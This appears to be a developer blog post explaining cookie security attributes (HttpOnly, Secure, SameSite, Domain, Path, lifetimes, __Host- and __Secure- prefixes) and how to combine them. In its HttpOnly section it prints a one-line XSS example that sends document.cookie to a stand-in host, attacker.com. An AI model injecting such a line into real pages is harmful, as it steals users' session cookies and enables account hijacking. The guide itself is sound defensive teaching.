---
title: "Secure Cookie Design: HttpOnly, Secure, SameSite, and Domain"
description: "Cookies carry sessions, tokens, and identity — and a single misconfigured attribute can expose them to XSS, CSRF, or network interception. A complete guide to every cookie security attribute, what it does, and how to combine them correctly."
pubDate: 2026-06-03
author: "Khashayar Parhami"
tags: ["security", "guide"]
image: "/images/og/secure-cookie-design.png"
featured: false
---

Cookies are the primary mechanism for maintaining state in web applications — sessions, authentication tokens, preferences. Every cookie that carries something sensitive is also a target. The browser's cookie security model gives you precise control over how cookies are scoped, transmitted, and accessed — but only if you use the attributes correctly.

Most developers know `HttpOnly` and `Secure` exist. Far fewer understand what `SameSite=Lax` vs `SameSite=Strict` actually protects against, why `Domain` can be dangerous to set, or what cookie prefixes do. This guide covers every attribute that matters for security.

---

## Anatomy of a Set-Cookie Header

The server sets cookies via the `Set-Cookie` response header:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400
```

Each semicolon-separated directive is an attribute. The browser stores the cookie and returns it on matching future requests via the `Cookie` header:

```http
Cookie: session=abc123
```

The key insight: **the browser, not your application code, enforces these attributes.** Your server sets them once; the browser's security model does the rest.

---

## HttpOnly

```http
Set-Cookie: session=abc123; HttpOnly
```

`HttpOnly` tells the browser that this cookie must not be accessible to JavaScript. `document.cookie` cannot read it. `fetch()` and `XMLHttpRequest` cannot read it either. The browser sends it automatically with every matching request, but no script on your page — including injected third-party scripts — can touch it.

### What it protects against

**XSS token theft.** If an attacker injects JavaScript into your page (via a DOM injection, a compromised CDN, a third-party widget vulnerability), they cannot steal an `HttpOnly` session cookie. Without `HttpOnly`, a single XSS vulnerability on any page of your site exposes every visitor's session to theft.

```javascript
// Without HttpOnly — attacker can steal the session
document.location = 'https://attacker.com/steal?c=' + document.cookie;

// With HttpOnly — document.cookie doesn't include HttpOnly cookies
// The above exfiltrates nothing useful
```

### What it does NOT protect against

`HttpOnly` does not protect against CSRF — the browser still sends the cookie automatically on cross-origin requests. It doesn't protect against session fixation or session hijacking via other means. It specifically and only prevents JavaScript from reading the cookie value.

### When to use it

Use `HttpOnly` on **every cookie that carries authentication state** — session IDs, tokens, refresh tokens. The only reason not to use it is if your JavaScript legitimately needs to read the cookie value, which is rarely the case for security-sensitive cookies.

---

## Secure

```http
Set-Cookie: session=abc123; Secure
```

`Secure` tells the browser to only send this cookie over HTTPS connections. It will never be sent over plain HTTP, even if the user somehow reaches your site via an `http://` URL.

### What it protects against

**Network interception.** Without `Secure`, if a user visits your site over HTTP — even once, even by accident, even via a redirect — the cookie is sent in plaintext and can be captured by anyone on the same network (public Wi-Fi, ISP, corporate proxy).

### Secure + HSTS

`Secure` alone has a timing gap: the very first request to your site might be HTTP before the `Secure` cookie is set. **HSTS (HTTP Strict Transport Security)** closes this by telling the browser to always use HTTPS for your domain before making any requests:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

With HSTS preloaded, the browser never makes an HTTP request to your domain at all — eliminating the window where a cookie could be intercepted.

### When to use it

Use `Secure` on every cookie. On localhost, `Secure` cookies don't require HTTPS (browsers exempt `localhost`). In production, there is no valid reason to omit it.

---

## SameSite

`SameSite` is the most nuanced cookie attribute, and the most frequently misunderstood. It controls whether the browser includes the cookie in **cross-site requests**.

Three values:

### SameSite=Strict

```http
Set-Cookie: session=abc123; SameSite=Strict
```

The cookie is **only sent when the request originates from the same site** as the cookie's domain. Navigation from an external site — clicking a link in an email, following a search result, arriving from a third-party page — will not include the cookie.

**Protects against:** All CSRF attacks. An attacker's page cannot trigger authenticated requests, because the cookie is never sent on cross-site navigation.

**Trade-off:** Users arriving from external links land as unauthenticated — they'll appear logged out even if they have a valid session. Clicking a shared link to your app from Slack will require a re-login. For many applications this is unacceptable UX.

**Use for:** Administrative interfaces, payment flows, any high-value operation where you can tolerate the UX trade-off.

### SameSite=Lax

```http
Set-Cookie: session=abc123; SameSite=Lax
```

The cookie is sent on **cross-site top-level navigation using safe HTTP methods** (GET, HEAD), but not on cross-origin subresource requests (images, iframes, fetch/XHR).

```
Cross-site link click (GET)     → cookie IS sent       ✓ user arrives logged in
Cross-site form POST            → cookie NOT sent      ✓ CSRF protection
Cross-origin fetch/XHR          → cookie NOT sent      ✓ CSRF protection
Cross-origin image/iframe load  → cookie NOT sent      ✓ 
```

**Protects against:** CSRF attacks via form POST and subresource requests — the most common attack vectors.

**Does not protect against:** CSRF via cross-site GET requests. If your application has state-changing GET endpoints (never do this), Lax doesn't help.

**This is the browser default** in Chrome and Firefox for cookies without an explicit `SameSite` attribute.

**Use for:** Session cookies in standard web applications. Provides solid CSRF protection without breaking the user experience of arriving from external links.

### SameSite=None

```http
Set-Cookie: session=abc123; SameSite=None; Secure
```

The cookie is sent on all requests, including cross-origin ones. **Requires `Secure`** — browsers reject `SameSite=None` without it.

**Use for:** Cookies that legitimately need to be sent cross-origin — third-party embeds, widgets, authentication flows that span multiple domains. Do not use this for session or auth cookies on your own application.

### The CSRF picture

| SameSite value | Cross-site GET | Cross-site POST | Cross-origin fetch |
|---|---|---|---|
| `Strict` | Not sent | Not sent | Not sent |
| `Lax` | Sent | Not sent | Not sent |
| `None` | Sent | Sent | Sent |
| (missing, legacy) | Sent | Sent | Sent |

For most applications: use `SameSite=Lax` for session cookies. Add a CSRF token for any state-changing operation if you need defence in depth.

---

## Domain

```http
Set-Cookie: session=abc123; Domain=example.com
```

`Domain` controls which hostnames receive the cookie. This attribute is commonly misunderstood — and **setting it is usually more permissive, not more restrictive**.

### The default (no Domain attribute)

Without `Domain`, the cookie is scoped to the **exact host** that set it. A cookie set by `app.example.com` is sent only to `app.example.com`. Subdomains (`api.example.com`, `admin.example.com`) do not receive it.

### When you set Domain

Setting `Domain=example.com` makes the cookie available to **example.com and all its subdomains** — `app.example.com`, `api.example.com`, `admin.example.com`, and any others. This is broader, not narrower.

```http
// Cookie set by app.example.com

// Without Domain:
Set-Cookie: session=abc123
// Sent to: app.example.com only

// With Domain=example.com:
Set-Cookie: session=abc123; Domain=example.com
// Sent to: example.com, app.example.com, api.example.com, admin.example.com, ...
```

### Security implication

If you set `Domain=example.com` on a session cookie and any subdomain — including a forgotten staging environment, a third-party service hosted on your subdomain, or a user-controlled subdomain — is compromised, that attacker receives your authentication cookies on every request.

**Rule:** Do not set `Domain` unless you have a specific reason to share a cookie across subdomains. The default (no `Domain`) is safer.

---

## Path

```http
Set-Cookie: session=abc123; Path=/
```

`Path` scopes the cookie to a URL path prefix. `Path=/` sends the cookie on all requests. `Path=/admin` sends it only on requests to `/admin/*`.

Path scoping provides some isolation but is **not a security boundary** — JavaScript running on any path of the same origin can still read cookies on other paths (unless `HttpOnly`). Use `Path` for organisational purposes, not as a security control.

---

## Max-Age and Expires

These control cookie lifetime.

```http
Set-Cookie: session=abc123; Max-Age=86400      // expires in 24 hours
Set-Cookie: session=abc123; Expires=Thu, 05 Jun 2026 09:00:00 GMT
```

**Max-Age** specifies a duration in seconds. **Expires** specifies an absolute date. When both are present, `Max-Age` takes precedence.

A cookie with neither becomes a **session cookie** — it's deleted when the browser session ends (when the browser is closed, not the tab).

### Security considerations

| Scenario | Recommendation |
|---|---|
| Session cookie | No `Max-Age`/`Expires` — expire with browser session, or short Max-Age |
| "Remember me" / persistent login | Long `Max-Age` with server-side refresh token rotation |
| CSRF token | Match session lifetime |
| Short-lived operation token | Short `Max-Age` (minutes) |

Longer cookie lifetimes mean longer windows where a stolen cookie is valid. Keep session cookie lifetimes short and use refresh token rotation for persistence.

---

## Cookie Prefixes

Cookie prefixes are a relatively recent addition that let cookies signal their own security requirements, making it harder to accidentally override security attributes.

### `__Secure-` prefix

```http
Set-Cookie: __Secure-session=abc123; Secure; HttpOnly; SameSite=Lax
```

A cookie name starting with `__Secure-` will be rejected by the browser unless:
- The `Secure` attribute is present
- The request came from a secure origin (HTTPS)

This prevents a cookie from being set on an HTTP page and overriding a more secure cookie.

### `__Host-` prefix

```http
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
```

The most restrictive prefix. Requires:
- `Secure` attribute
- No `Domain` attribute (automatically scoped to the exact host)
- `Path=/`

`__Host-` cookies cannot be overridden by subdomains or HTTP pages. Use this for the highest-value cookies — authentication sessions, CSRF tokens.

---

## Putting It All Together

The ideal session cookie for a standard web application:

```http
Set-Cookie: __Host-session=<value>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=28800
```

Breaking it down:
- `__Host-` prefix — enforces `Secure`, no `Domain`, `Path=/`
- `HttpOnly` — JavaScript cannot read the value
- `Secure` — HTTPS only (also required by `__Host-`)
- `SameSite=Lax` — blocks CSRF on POST/fetch, allows top-level navigation
- `Path=/` — sent on all requests (required by `__Host-`)
- `Max-Age=28800` — 8-hour session lifetime

For an administrative interface where CSRF protection is critical:

```http
Set-Cookie: __Host-admin-session=<value>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

For a third-party embed that legitimately needs cross-origin cookies:

```http
Set-Cookie: embed-state=<value>; Secure; SameSite=None; Max-Age=3600
```

---

## Quick Reference

| Attribute | Purpose | Default if omitted |
|---|---|---|
| `HttpOnly` | Blocks JS access | JS can read the cookie |
| `Secure` | HTTPS only | Sent over HTTP too |
| `SameSite=Lax` | Blocks cross-site POST/fetch | Lax (modern browsers) |
| `SameSite=Strict` | Blocks all cross-site requests | — |
| `SameSite=None` | Allows cross-site (requires Secure) | — |
| `Domain` | Shares cookie with subdomains | Exact host only |
| `Path` | URL path scope | Path of the Set-Cookie URL |
| `Max-Age` | Lifetime in seconds | Session cookie (browser close) |
| `__Secure-` prefix | Enforces Secure attribute | — |
| `__Host-` prefix | Enforces Secure, no Domain, Path=/ | — |

---

## Further Reading

- [Session vs Token Authentication](/blog/session-vs-token-authentication) — how sessions and cookies fit into auth architecture
- [API Security Checklist](/blog/api-security-checklist) — CSRF and header controls in the broader API context
- [Zero Trust Architecture](/blog/zero-trust-explained) — why "inside the network" isn't a trust boundary
